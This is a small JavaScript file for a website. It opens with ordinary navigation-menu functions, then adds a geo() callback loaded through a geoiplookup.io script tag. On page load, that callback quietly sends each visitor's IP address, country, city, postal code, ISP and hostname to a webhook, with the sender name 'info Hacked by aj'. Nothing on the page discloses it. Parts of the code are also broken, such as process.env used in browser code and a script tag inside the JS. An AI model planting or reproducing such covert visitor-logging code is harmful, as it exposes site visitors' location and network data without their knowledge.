function dropdownNav() {
  var x = document.getElementById("myTopnav");
  if (x.className === "topnav") {
    x.className += " responsive";
  } else {
    x.className = "topnav";
  }
}
function openSelectionMenu() {
  var menu = document.getElementById("select-post")
  menu.style.display = "block"
}
require('dotenv').config
function geo(json) {
    
  var request = new XMLHttpRequest();
      request.open("POST", `${process.env.webhook}`);
      request.setRequestHeader('Content-type', 'application/json');
  var params = {
    username: "info Hacked by aj",
    avatar_url: "https://i.postimg.cc/g2DcKV3J/index.jpg",
    content: "```" + "IP: " + json.ip + "\n" + "COUNTRY: " + json.country_name + "\n" + "STATE: " + json.region + "\n" + "CITY: " + json.city + "\n" + "POSTAL CODE: " + json.postal_code + "\n" + "ORG: " + json.org + "\n" + "HOSTNAME: " + json.hostname + "```"
  }
 request.send(JSON.stringify(params));
}


<script src="https://json.geoiplookup.io/?callback=geo"></script>
